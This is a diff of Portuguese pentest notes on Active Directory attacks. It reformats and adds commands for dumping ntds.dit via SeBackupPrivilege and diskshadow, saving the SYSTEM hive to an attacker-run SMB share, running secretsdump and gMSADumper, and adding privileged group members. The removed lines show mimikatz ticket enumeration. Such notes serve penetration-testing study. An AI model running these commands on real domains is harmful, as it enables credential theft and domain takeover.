@@ -13,10 +13,11 @@ Aqui já podemos levar em conta que já temos uma credencial válida de domínio
 - [ ] [**Dump de hashes**](#lsass-dump)
 - [ ] [**Pass the Hash**](#pass-the-hash)
 - [ ] [**Over Pass the Hash**](#over-pass-the-hash)
-- [ ] [**Silver Ticket**](#silver-ticket)
-- [ ] [**Adicionar usuário privilegiado**](#adicionar-usuario-privilegiado)
-- [ ] [**Permissionamento de usuário**](#permissionamento-de-usuario)
-- [ ] [**Unconstrained delegation**](#unconstrained%20delegation)
+- [ ] [**Silver Ticket**](#silver%20ticket)
+- [ ] [**Adicionar usuário privilegiado**](#adicionar%20usuario%20privilegiado)
+- [ ] [**Permissionamento de usuário**](#permissionamento%20de%20usuario)
+- [ ] [**GMSAPassword**](#gmsapassword)
+
 
 ## Enumeração do domínio com Bloodhound
 
@@ -362,11 +363,15 @@ Aqui já teremos o .ccache e podemos carregar essa informação no Kali Linux da
 
 ## Conversão de senha em texto claro para hash NT
 
-    iconv -f ASCII -t UTF-16LE &#x3C;(printf "<senha>") | openssl dgst -md4
+```
+iconv -f ASCII -t UTF-16LE &#x3C;(printf "<senha>") | openssl dgst -md4
+```
 
 ou
 
-    python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "<senha>".encode("utf-16le")).digest()))'
+```
+python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "<senha>".encode("utf-16le")).digest()))'
+```
 
 
 Para conduzir esse ataque, primeiro temos que injetar na memória do nosso processo a credencial do nosso usuário administrativo, por exemplo:
@@ -406,7 +411,7 @@ ou em um grupo de domínio
 
     net group "Exchange Windows Permissions" /add <usuario>
 
-## Permissionamento de usuário
+## Permissionamento de usuario
 
 Esse ponto consistem em obter os hashes de senha dos usuários do AD utilizando a permissão de usuário SeBackupPrivilege do usuário:
 
@@ -433,69 +438,48 @@ Adequando o arquivo para leitura correto do SO Windows:
 
 fazer o upload do arquivo na máquina alvo e executar os seguintes comandos:
 
-    diskshadow /s test.dsh
-    robocopy /b z:\windows\ntds . ntds.dit
-    
+```
+diskshadow /s test.dsh
+robocopy /b z:\windows\ntds . ntds.dit
+```
 
 Fazer o download do arquivo ntds.dit para a máquina do atacante. Além deste arquivo, vamos precisar do SYSTEM tabém, que podemos obter por meio do seguinte comando:
 
 (Se necessário, fornecer credencial):
 
-    net use \\10.0.0.1\smb /user:test test
+```
+net use \\10.0.0.1\smb /user:test test
+```
 
 depois:
 
-    reg save HKLM\SYSTEM \\10.0.0.1\smb\system
+```
+reg save HKLM\SYSTEM \\10.0.0.1\smb\system
+```
 
 
 
 claro que temos que estar com o servidor smb de pé (se necessário, colocar senha e usuário):
 
-    impacket-smbserver -smb2support smb .
+```
+impacket-smbserver -smb2support smb .
+```
 
 ou
 
-    impacket-smbserver -smb2support -username test -password test smb .
+```
+impacket-smbserver -smb2support -username test -password test smb .
+```
 
 Assim que os arquivos necessários estiverem an máquina do atacante, considere o seguinte comando:
 
-    impacket-secretsdump local -ntds ntds.dit -system system
-
-## Unconstrained delegation
-
-A premissa é achar uma máquina que possui "unconstrained delegation" ou unrestricted kerberos delegation" configurado, pois nela será salvo os TGTs de usuários que podemos utilizá-los para nos autenticar em outras máquinas:
-
-Enumerando
 ```
-Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
-```
-
-_Remotamente_
-
-```
-ldapsearch -LLL -x -H ldap://dc.support.htb -D "support@support.htb" -W -b "dc=support,dc=htb" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
-```
-
-```
-ldapsearch -LLL -x -H ldap://pdc01.lab.ropnop.com -D "thoffman@lab.ropnop.com" -W -b "dc=lab,dc=ropnop,dc=com" "(&(objectCategory=computer)(objectClass=computer) userAccountControl:1.2.840.113556.1.4.80 3:=524288))"
+impacket-secretsdump local -ntds ntds.dit -system system
 ```
 
 
-Com powerview podemos utilizar o seguinte comando:
+## gMSAPassword
 
 ```
-Get-DomainComputer -Unconstrained
+python /home/acosta/work/Area_de_trabalho/tools/windows/6-AD_Tools/gMSADumper/gMSADumper.py -u <usuario> -p <senha> -d <nome_dominio>
 ```
-
-Para enumerar os TGTs presentes na máquina, precisamos executar o mimikatz com os seguintes comandos:
-
-```
-mimikatz.exe
-debug::privileges
-sekurlsa::tickets
-```
-
-## Constrained delegation
-
-
-(userAccountControl:1.2.840.113556.1.4.803:=524288)’
